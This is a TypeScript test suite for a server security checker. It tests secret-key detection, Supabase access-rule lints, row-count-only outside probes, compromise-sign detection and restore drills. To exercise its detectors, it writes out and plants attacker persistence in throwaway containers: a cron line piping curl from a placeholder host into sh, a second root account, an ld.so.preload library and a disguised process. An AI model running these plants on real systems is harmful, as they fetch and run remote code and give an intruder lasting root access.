// V2, deep security. What a stranger can do, door rules, break-in signs, panels, default secrets, the breach list, the brake and the
// fire drill. The rules that matter most: outside checks count rows and read none, an anon key alone is never an alarm, a value never
// leaves the server, and a strong sign says rebuild.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHmac, randomBytes } from 'node:crypto';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { testApp, testOrg, ok } from './helpers.ts';
import { id, run } from '../src/db.ts';
import { dockerAvailable } from './fixture.ts';
import { ssh } from '../src/connectors/ssh.ts';
import { script } from '../src/connectors/shell.ts';
import { Redactor } from '../src/redact.ts';
import { manageDirs } from '../src/tools/manage.ts';
import { saveXray } from '../src/tools/xray.ts';
import { badRandom, jwtRole, keysIn, scriptsIn, signedWithDefault, strangerLook, supabaseIn, tableFinding } from '../src/secure/stranger.ts';
import { LINTS, doorCheck, doorFindings } from '../src/secure/doors.ts';
import { SIGNS, signsOf, snapshotOf, wordsFor } from '../src/secure/hacked.ts';
import { advisoriesFor, cmpVersion, inRange, panelFinding, versionsIn } from '../src/secure/panels.ts';
import { BRAKES, DEFAULTS, WEAK, brakeView, comeback, rotateList, weakFindings } from '../src/secure/more.ts';
import { pgRead } from '../src/care/partchecks.ts';
import type { Inventory, Part } from '../src/discovery/xray.ts';

const SRV = 'srv_secure000001', jwt = (payload: object, secret = 'x') => { const h = Buffer.from('{"alg":"HS256"}').toString('base64url'), p = Buffer.from(JSON.stringify(payload)).toString('base64url'); return `${h}.${p}.${createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url')}`; };
const world = async () => { const app = testApp(); const o = await testOrg(app); run(app.db, `INSERT INTO servers (id, org_id, name, host, key_ref, status, facts) VALUES (?, ?, 'vps', '203.0.113.9', 'credential://x', 'ready', '{}')`, SRV, o.orgId); return { app, o }; };

test('S4: keys get two labels, and an anon key alone is never an alarm', () => {
  const live = `sk_live_${'a'.repeat(24)}`;
  assert.deepEqual(keysIn(`const a="${live}"; const b="pk_live_${'b'.repeat(24)}";`).map((k) => [k.name, k.label, k.tail]), [['Stripe secret key', 'can spend your money', 'aaaa'], ['Stripe public key', 'meant to be public', 'bbbb']]);
  assert.equal(jwtRole(jwt({ role: 'anon' }))!.role, 'anon');
  const js = `createClient("https://abcd1234.supabase.co","${jwt({ role: 'anon' })}")`, s = supabaseIn(js, 'app.example.com');
  assert.deepEqual(s.urls, ['https://abcd1234.supabase.co']); assert.ok(s.anon); assert.equal(s.service, undefined);
  assert.ok(supabaseIn(`x="${jwt({ role: 'service_role' })}"`, 'a.com').service);
  assert.equal(signedWithDefault(jwt({ role: 'anon' }, 'your-super-secret-jwt-token-with-at-least-32-characters-long')), true); assert.equal(signedWithDefault(jwt({ role: 'anon' }, randomBytes(32).toString('hex'))), false);
  assert.equal(badRandom('const token = Math.random().toString(36)'), true); assert.equal(badRandom('const x = Math.random() * 10'), false);
  assert.deepEqual(scriptsIn('<script src="/a.js"></script><script src="https://cdn.other.com/b.js"></script>', 'https://x.com'), ['https://x.com/a.js'], 'only its own files');
});

test('S2: a stranger’s look from outside: counts, never rows', async () => {
  const anon = jwt({ role: 'anon' }), asked: { url: string; method: string }[] = [], real = globalThis.fetch;
  globalThis.fetch = (async (u: string | URL, init?: RequestInit) => {
    const url = String(u); asked.push({ url, method: init?.method ?? 'GET' });
    if (url === 'https://shop.example.com/') return new Response('<html><script src="/app.js"></script></html>', { status: 200 });
    if (url.endsWith('/app.js')) return new Response(`createClient("https://abcd.supabase.co","${anon}")\n//# sourceMappingURL=app.js.map`, { status: 200 });
    if (url.endsWith('/app.js.map')) return new Response(null, { status: 200 });
    if (url === 'https://abcd.supabase.co/rest/v1/') return new Response(JSON.stringify({ paths: { '/': {}, '/profiles': {}, '/secrets': {}, '/rpc/do_thing': {} } }), { status: 200 });
    if (url.includes('/rest/v1/profiles')) return new Response(null, { status: 206, headers: { 'content-range': '0-0/1842' } });
    if (url.includes('/rest/v1/secrets')) return new Response(null, { status: 200, headers: { 'content-range': '*/0' } });
    return new Response('nope', { status: 404 });
  }) as typeof fetch;
  try {
    const r = await strangerLook({} as never, 'shop.example.com');
    assert.ok(r.findings.some((f) => f.id === 'stranger:sourcemap:shop.example.com'));
    const t = r.findings.find((f) => f.id.startsWith('stranger:tables:'))!;
    assert.equal(t.severity, 'critical'); assert.match(t.title, /Anyone can read 1,842 rows/); assert.match(t.evidence!, /profiles: 1,842 rows/); assert.ok(!/secrets/.test(t.evidence!), 'a table that shows no rows isn’t on the list');
    assert.ok(!r.findings.some((f) => /public key|anon/i.test(f.title)), 'the anon key by itself raises nothing');
    const reads = asked.filter((a) => a.url.includes('/rest/v1/') && !a.url.endsWith('/rest/v1/'));
    assert.ok(reads.length >= 2); assert.ok(reads.every((a) => a.method === 'HEAD'), 'HEAD only: a count, never a row'); assert.ok(reads.every((a) => a.url.includes('limit=1')));
    assert.ok(!asked.some((a) => a.url.includes('rpc/')), 'it calls no functions');
  } finally { globalThis.fetch = real; }
  assert.equal(tableFinding('x', [{ table: 'a', rows: 0 }]), undefined);
});

test('S2: it only looks at what’s yours', async () => {
  const { o } = await world();
  const r = ok<{ refused?: string }>(await o.h('security.stranger', { host: 'someone-else.example.com' }));
  assert.ok(r.refused === undefined ? process.env.UNIT7_SKIP_NET_PROBE !== undefined : /isn’t tied to you/.test(r.refused));
});

test('S3: door rules, in your words first', () => {
  const s = { id: SRV, name: 'vps' }, p = { id: 'db', name: 'Supabase' };
  const f = doorFindings(s, p, { noRls: [['orders', 't'], ['profiles', 't'], ['internal', 'f']], openPolicy: [['notes', 'anyone', 'SELECT']], riskyFn: [['reset_all']], publicBucket: [['avatars']], noPolicy: [['logs']], slowPolicy: [['orders', 'p1']] });
  assert.deepEqual(f.map((x) => [x.id.split(':')[1], x.severity]), [['no-rls', 'critical'], ['no-policy', 'low'], ['open-policy', 'high'], ['risky-fn', 'high'], ['public-bucket', 'medium'], ['slow-policy', 'low']]);
  assert.match(f[0]!.title, /2 tables have no door rule, and the public key can reach them/); assert.match(f[0]!.detail, /door rule \(RLS\)/);
  assert.equal(doorFindings(s, p, { noRls: [['internal', 'f']] })[0]!.severity, 'low', 'off but out of reach');
  assert.deepEqual(doorFindings(s, p, {}), []);
  for (const q of Object.values(LINTS)) assert.ok(/^select /.test(q) && !/\b(update|delete|insert|drop)\b/i.test(q));
});

test('S5: strong signs say rebuild, a change since the first look asks, and quiet proves nothing', () => {
  const out = (o: Partial<Record<string, string>>) => ['keys', 'users', 'cron', 'shell', 'preload', 'procs', 'exes'].map((k) => `@@${k}\n${o[k] ?? ''}`).join('\n');
  assert.deepEqual(signsOf(out({ users: 'root:0:/bin/bash' })), []);
  assert.equal(signsOf(out({ procs: '123 99.0 xmrig /tmp/xmrig -o pool' }))[0]!.strong, true);
  assert.equal(signsOf(out({ exes: '123 /tmp/.x/kworker' }))[0]!.kind, 'odd-exe');
  assert.equal(signsOf(out({ preload: '/lib/evil.so' }))[0]!.kind, 'preload');
  const odd = out({ cron: '@reboot curl http://x.sh | sh' });
  assert.equal(signsOf(odd)[0]!.kind, 'odd-cron'); assert.equal(signsOf(odd)[0]!.strong, false, 'it may have always been there, and be an honest updater');
  assert.equal(signsOf(odd, snapshotOf(out({})))[0]!.strong, true, 'it wasn’t there at the first look'); assert.equal(signsOf(odd, snapshotOf(odd))[0]!.strong, false);
  assert.match(SIGNS, /ns\/mnt/); assert.ok(!SIGNS.includes('(deleted)'), 'a program replaced by a normal update isn’t a break-in');
  assert.equal(signsOf(out({ users: 'toor:0:/bin/sh' }))[0]!.kind, 'second-root');
  assert.deepEqual(signsOf(out({ procs: '123 99.0 node node server.js' })), [], 'a busy app is just a busy app');
  const was = snapshotOf(out({ keys: '/root SHA256:aaa me@mac', users: 'root:0:/bin/bash', cron: '0 3 * * * backup' }));
  const now = signsOf(out({ keys: '/root SHA256:aaa me@mac\n/root SHA256:bbb who', users: 'root:0:/bin/bash\nbob:1001:/bin/bash', cron: '0 3 * * * backup\n*/5 * * * * thing' }), was);
  assert.deepEqual(now.map((s) => s.kind), ['new-key', 'new-user', 'new-cron']); assert.ok(now.every((s) => !s.strong));
  assert.equal(wordsFor([]).verdict, 'No signs'); assert.match(wordsFor([]).line, /can’t prove nobody got in/);
  assert.match(wordsFor([{ kind: 'miner', strong: true, what: 'x' }]).line, /Don’t try to clean it/); assert.equal(wordsFor([{ kind: 'new-key', strong: false, what: 'x' }]).verdict, 'Something changed');
  assert.ok(!/\b(rm|kill|docker (stop|rm)|systemctl (stop|restart)|chmod|chown)\b/.test(SIGNS), 'it only reads');
});

test('S6, S7: versions, ranges and advisories', () => {
  assert.equal(cmpVersion('4.0.0-beta.434', '4.0.0-beta.442'), -1); assert.equal(cmpVersion('4.0.0-beta.442', '4.0.0'), -1, 'a beta comes before its release'); assert.equal(cmpVersion('v1.10.0', '1.9.0'), 1); assert.equal(cmpVersion('1.2.3', '1.2.3'), 0);
  assert.equal(inRange('1.5.0', '>= 1.0.0, < 2.0.0'), true); assert.equal(inRange('2.0.0', '>= 1.0.0, < 2.0.0'), false); assert.equal(inRange('4.0.0-beta.400', '< 4.0.0-beta.420'), true);
  const adv = [{ ghsa_id: 'GHSA-1', severity: 'critical', summary: 'x', vulnerabilities: [{ vulnerable_version_range: '< 4.0.0-beta.420' }] }, { ghsa_id: 'GHSA-2', severity: 'high', summary: 'y', vulnerabilities: [{ vulnerable_version_range: '< 3.0.0' }] }];
  assert.deepEqual(advisoriesFor(adv, '4.0.0-beta.400').map((a) => a.ghsa_id), ['GHSA-1']);
  const s = { id: SRV, name: 'vps' };
  assert.equal(panelFinding(s, 'Coolify', { version: '4.0.0-beta.400', advisories: adv, open: true })[0]!.severity, 'critical'); assert.equal(panelFinding(s, 'Coolify', { version: '4.0.0-beta.400', advisories: adv })[0]!.severity, 'high', 'not reachable from outside');
  assert.match(panelFinding(s, 'n8n', { version: '1.0.0', latest: '2.0.0', advisories: [] })[0]!.title, /n8n is behind/); assert.deepEqual(panelFinding(s, 'n8n', { version: '2.0.0', latest: '2.0.0', advisories: [] }), []);
  assert.deepEqual(versionsIn({}, '', 'window.next={version:"15.1.0",appDir:!0}'), [{ name: 'next', ecosystem: 'npm', version: '15.1.0' }]);
  assert.equal(versionsIn({}, '<meta name="generator" content="WordPress 6.4.2" />')[0]!.version, '6.4.2'); assert.deepEqual(versionsIn({}, '<html>'), []);
});

test('S10: a rotate-this list, most dangerous first, and public names last', () => {
  const l = rotateList('supabase', [{ name: 'CRM', keys: ['NEXT_PUBLIC_SUPABASE_ANON_KEY', 'SUPABASE_SERVICE_ROLE_KEY', 'SUPABASE_URL', 'STRIPE_KEY'] }, { name: 'Tracker', keys: ['DATABASE_URL'] }]);
  assert.deepEqual(l.map((t) => t.key), ['SUPABASE_SERVICE_ROLE_KEY', 'SUPABASE_URL', 'DATABASE_URL', 'NEXT_PUBLIC_SUPABASE_ANON_KEY']); assert.ok(l.every((t) => !t.done));
  assert.deepEqual(rotateList('someprovider', [{ name: 'x', keys: ['SOMEPROVIDER_TOKEN', 'OTHER'] }]).map((t) => t.key), ['SOMEPROVIDER_TOKEN']);
});

test('S10 end to end: a list with ticks, and a copy taken', async () => {
  const { app, o } = await world();
  saveXray(app.db, o.orgId, SRV, 'fast', { version: 1, at: new Date().toISOString(), server: {}, paas: [], projects: [], loose: [], ports: [], repos: [], summary: '', notes: [], parts: [{ id: 'a', kind: 'app', name: 'CRM', owner: 'coolify', trust: 'seen', envKeys: ['STRIPE_SECRET_KEY', 'STRIPE_WEBHOOK_SECRET'] }] } as never);
  const r = ok<{ id: string; items: { key: string }[] }>(await o.h('security.breach', { provider: 'stripe' }));
  assert.equal(r.items.length, 2);
  assert.equal(ok<{ left: number }>(await o.h('security.breach_tick', { id: r.id, app: 'CRM', key: 'STRIPE_SECRET_KEY' })).left, 1);
});

test('S11: an alert isn’t a brake', () => {
  const v = brakeView(['hostinger', 'gcp', 'vercel', 'openai', 'github']);
  assert.deepEqual(v.list.map((b) => b.brake), ['fixed', 'none', 'needs-setup', 'prepaid']); assert.match(v.line, /2 of 4 can run away with no brake: gcp, vercel/); assert.match(v.worst!, /13 to 48 hours/);
  assert.equal(brakeView(['hostinger']).worst, undefined); assert.match(brakeView([]).line, /Nothing connected/);
  assert.equal(BRAKES.gcp!.brake, 'none');
});

test('N12: measured and estimated are kept apart, and what’s missing is said', () => {
  const c = comeback({ restoreMs: 120_000, apps: 2, files: false, offServer: false, settings: true });
  assert.equal(c.minutes, 15 + 3 + 10 + 10); assert.equal(c.steps[1]!.measured, true); assert.equal(c.steps[0]!.measured, false);
  assert.equal(c.gaps.length, 2); assert.match(c.gaps[0]!, /you’d have nothing to restore/);
  assert.deepEqual(comeback({ restoreMs: 1000, apps: 1, files: true, offServer: true, settings: true }).gaps, []);
});

const localExec = (app: ReturnType<typeof testApp>) => { ssh(app).exec = ((_s: unknown, command: string, opts: { stdin?: string } = {}) => new Promise((resolve) => { const c = spawn('sh', ['-c', command]); let stdout = '', stderr = ''; c.stdout.on('data', (d) => { stdout += d; }); c.stderr.on('data', (d) => { stderr += d; }); c.stdin.on('error', () => undefined); c.stdin.end(opts.stdin ?? ''); c.on('close', (code) => resolve({ code: code ?? 1, stdout, stderr, truncated: false })); })) as never; };

test('real Docker: the door lints run on a real Postgres, and defaults are found by name with the value staying put', { skip: !dockerAvailable() && 'Docker isn’t available here', timeout: 120_000 }, async () => {
  const c = `unit7-doors-${id('x').slice(2, 8).toLowerCase().replace(/[^a-z0-9]/g, 'a')}`;
  spawnSync('docker', ['run', '-d', '--name', c, '-e', 'POSTGRES_PASSWORD=your-super-secret-and-long-postgres-password', '-e', 'MY_API_KEY=changeme', '-e', 'NEXT_PUBLIC_API_KEY=changeme', 'postgres:16-alpine'], { stdio: 'ignore' });
  try {
    for (let i = 0; i < 80 && spawnSync('docker', ['exec', c, 'pg_isready', '-h', '127.0.0.1', '-U', 'postgres']).status !== 0; i++) await new Promise((r) => setTimeout(r, 500));
    execFileSync('docker', ['exec', c, 'psql', '-U', 'postgres', '-c', `create role anon; create role authenticated; create schema auth; create function auth.uid() returns uuid language sql as 'select null::uuid';
      create table open_table (id int); grant select on open_table to anon;
      create table closed_table (id int);
      create table ruled (id int, owner uuid); alter table ruled enable row level security; create policy p1 on ruled for select to anon using (true);
      create table slow (id int, owner uuid); alter table slow enable row level security; create policy p2 on slow for select to authenticated using (owner = auth.uid());
      create table locked (id int); alter table locked enable row level security;
      create function do_all() returns void language sql security definer as 'select 1'; grant execute on function do_all() to anon;
      create schema storage; create table storage.buckets (name text, public boolean); insert into storage.buckets values ('avatars', true), ('invoices', false);`]);
    const { app, o } = await world(); localExec(app);
    const ctx = { app, db: app.db, orgId: o.orgId, redactor: new Redactor(), progress() {}, signal: undefined } as never, s = { id: SRV, name: 'vps', facts: '{}' } as never;
    const p = { id: 'db', kind: 'database', name: 'Supabase', owner: 'coolify', trust: 'seen', engine: 'postgres', image: 'postgres:16-alpine', containers: [c], state: 'running' } as Part;
    for (const k of Object.keys(LINTS) as (keyof typeof LINTS)[]) assert.ok(await pgRead(ctx, s, p, LINTS[k]), `${k} runs`);
    const r = await doorCheck(ctx, s, p), f = doorFindings({ id: SRV, name: 'vps' }, p, r), ids = f.map((x) => x.id.split(':')[1]);
    assert.deepEqual(r.noRls!.map((x) => x[0]).sort(), ['closed_table', 'open_table']); assert.deepEqual(r.noRls!.find((x) => x[0] === 'open_table')![1], 't'); assert.equal(r.noRls!.find((x) => x[0] === 'closed_table')![1], 'f');
    for (const k of ['no-rls', 'open-policy', 'risky-fn', 'public-bucket', 'slow-policy', 'no-policy']) assert.ok(ids.includes(k), k);
    assert.deepEqual(r.publicBucket, [['avatars']]);
    const out = (await ssh(app).exec(s, script(WEAK, c), { stdin: `${DEFAULTS.join('\n')}\n` } as never)).stdout;
    assert.ok(!/your-super-secret|changeme/.test(out), 'no value in what came back');
    const w = weakFindings({ id: SRV }, out);
    assert.equal(w.length, 1); assert.deepEqual(w[0]!.evidence, 'MY_API_KEY, POSTGRES_PASSWORD'); assert.equal(w[0]!.severity, 'high');
  } finally { spawnSync('docker', ['rm', '-f', c], { stdio: 'ignore' }); }
});

test('real Docker: the break-in script runs on Debian, and sees what’s planted', { skip: !dockerAvailable() && 'Docker isn’t available here', timeout: 120_000 }, async () => {
  const c = `unit7-signs-${id('x').slice(2, 8).toLowerCase().replace(/[^a-z0-9]/g, 'a')}`;
  spawnSync('docker', ['run', '-d', '--name', c, 'debian:stable-slim', 'sleep', '60'], { stdio: 'ignore' });
  try {
    const before = spawnSync('docker', ['exec', '-i', c, 'sh', '-s'], { input: SIGNS, encoding: 'utf8' });
    assert.equal(before.status, 0, before.stderr);
    const was = snapshotOf(before.stdout);
    assert.ok(was.users.some((u) => u.startsWith('root:0')));
    assert.deepEqual(signsOf(before.stdout, was).filter((s) => s.strong), []);
    execFileSync('docker', ['exec', c, 'sh', '-c', `mkdir -p /etc/cron.d; echo '@reboot root curl http://bad.example/x.sh | sh' > /etc/cron.d/odd; echo toor:x:0:0::/root:/bin/sh >> /etc/passwd; echo /lib/evil.so > /etc/ld.so.preload; cp /bin/sleep /tmp/kworker; (/tmp/kworker 30 &) ; echo hi >> /root/.bashrc`]);
    const after = spawnSync('docker', ['exec', '-i', c, 'sh', '-s'], { input: SIGNS, encoding: 'utf8' });
    const kinds = signsOf(after.stdout, was).map((s) => s.kind);
    for (const k of ['odd-cron', 'second-root', 'preload', 'odd-exe', 'changed-shell', 'new-user']) assert.ok(kinds.includes(k), `${k} in ${kinds.join(',')}`);
  } finally { spawnSync('docker', ['rm', '-f', c], { stdio: 'ignore' }); }
});

test('real Docker: a fire drill times a real restore and leaves nothing behind', { skip: !dockerAvailable() && 'Docker isn’t available here', timeout: 180_000 }, async () => {
  const live = `unit7-fire-${id('x').slice(2, 8).toLowerCase().replace(/[^a-z0-9]/g, 'a')}`, dir = mkdtempSync(join(tmpdir(), 'unit7-fire-')), file = join(dir, 'd.sql.gz');
  Object.assign(manageDirs, { backups: dir });
  spawnSync('docker', ['run', '-d', '--name', live, '-e', 'POSTGRES_PASSWORD=x', 'postgres:16-alpine'], { stdio: 'ignore' });
  try {
    for (let i = 0; i < 80 && spawnSync('docker', ['exec', live, 'pg_isready', '-h', '127.0.0.1', '-U', 'postgres']).status !== 0; i++) await new Promise((r) => setTimeout(r, 500));
    execFileSync('docker', ['exec', live, 'psql', '-U', 'postgres', '-c', 'create table a (id int)']);
    execFileSync('sh', ['-c', `docker exec ${live} pg_dumpall -U postgres | gzip > ${file}`]);
    const { app, o } = await world(); localExec(app);
    saveXray(app.db, o.orgId, SRV, 'fast', { version: 1, at: new Date().toISOString(), server: {}, paas: [], projects: [], loose: [], ports: [], repos: [], summary: '', notes: [], parts: [{ id: 'coolify:live', kind: 'database', name: 'live-db', owner: 'coolify', trust: 'seen', engine: 'postgres', image: 'postgres:16-alpine', containers: [live], state: 'running', project: 'p' }, { id: 'a', kind: 'app', name: 'web', owner: 'coolify', trust: 'seen', project: 'p' }] } as unknown as Inventory);
    run(app.db, `INSERT INTO backups (id, org_id, service_id, server_id, part, kind, reason, location, size, status, finished_at) VALUES ('bak_firedrill0001', ?, NULL, ?, 'coolify:live', 'postgres', 'x', ?, 1, 'done', ?)`, o.orgId, SRV, file, new Date().toISOString());
    const r = ok<{ line: string; minutes: number; gaps: string[]; measured: string }>(await o.h('safety.fire_drill', { serverId: SRV, part: 'coolify:live' }));
    assert.match(r.line, /^You could be back in about \d+ minutes\.$/); assert.match(r.measured, /took \d+ seconds on this server/); assert.equal(r.gaps.length, 3);
    assert.equal(execFileSync('sh', ['-c', `docker ps -a --filter label=unit7.copy-of=coolify:live -q`], { encoding: 'utf8' }).trim(), '', 'nothing left behind');
    writeFileSync;
  } finally { spawnSync('docker', ['rm', '-f', live], { stdio: 'ignore' }); }
});
